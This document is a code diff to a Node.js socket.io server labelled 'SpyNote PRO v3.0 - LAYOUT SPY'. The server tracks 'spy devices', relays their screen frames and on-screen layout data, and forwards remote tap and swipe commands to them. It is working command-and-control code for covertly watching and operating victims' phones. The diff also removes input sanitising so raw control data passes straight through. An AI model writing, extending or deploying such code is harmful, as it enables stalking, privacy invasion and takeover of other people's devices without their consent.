@@ -10,7 +10,7 @@ const io = socketIo(server, {
     cors: { origin: "*", methods: ["GET", "POST"] },
     pingTimeout: 30000,
     pingInterval: 10000,
-    maxHttpBufferSize: 100e6 // 100MB for HD + Layout
+    maxHttpBufferSize: 100e6
 });
 
 app.use(compression());
@@ -37,11 +37,12 @@ io.on('connection', (socket) => {
                 lastSeen: Date.now()
             });
             socket.join(`device_${deviceId}`);
-            console.log('📱 SPY DEVICE:', deviceId, deviceInfo.model, deviceInfo.capabilities);
+            console.log('📱 SPY DEVICE ONLINE:', deviceId, deviceInfo.model);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
+    // 🔥 SCREEN FRAMES
     socket.on('screen-frame', (frameData) => {
         const deviceId = frameData.deviceId;
         if (devices.has(deviceId)) {
@@ -50,27 +51,22 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 LAYOUT DATA RELAY
+    // 🔥 LAYOUT DATA - FIXED RELAY
     socket.on('layout-data', (layoutData) => {
         const deviceId = layoutData.deviceId;
+        console.log('📋 LAYOUT RECEIVED:', deviceId, layoutData.elements?.length || 0, 'elements');
+        
         if (devices.has(deviceId)) {
             socket.to(`device_${deviceId}`).emit('layout-data', layoutData);
         }
     });
 
+    // 🔥 CONTROL COMMANDS
     socket.on('control', (controlData) => {
         const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
         if (devices.has(deviceId)) {
-            socket.to(`device_${deviceId}`).emit('control', {
-                action,
-                x: parseFloat(x) || 0,
-                y: parseFloat(y) || 0,
-                startX: parseFloat(startX) || 0,
-                startY: parseFloat(startY) || 0,
-                endX: parseFloat(endX) || endY || 0,
-                endY: parseFloat(endY) || 0
-            });
-            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
+            io.to(`device_${deviceId}`).emit('control', controlData);
+            console.log(`🎮 CONTROL: ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x||0},${y||0})`);
         }
     });
 
@@ -86,7 +82,7 @@ io.on('connection', (socket) => {
     });
 });
 
-// Keep-alive
+// Keep-alive ping
 setInterval(() => {
     const now = Date.now();
     for (const [deviceId, info] of devices.entries()) {
@@ -99,7 +95,7 @@ setInterval(() => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 SpyNote PRO v3.0 - LAYOUT SPY running on port ${PORT}`);
+    console.log(`🚀 SpyNote PRO v3.0 - LAYOUT SPY`);
     console.log(`🌐 Web: http://localhost:${PORT}`);
-    console.log(`📱 Screenshot + Layout + Perfect Controls READY!`);
+    console.log(`📱 Screenshot + Layout + Controls READY!`);
 });
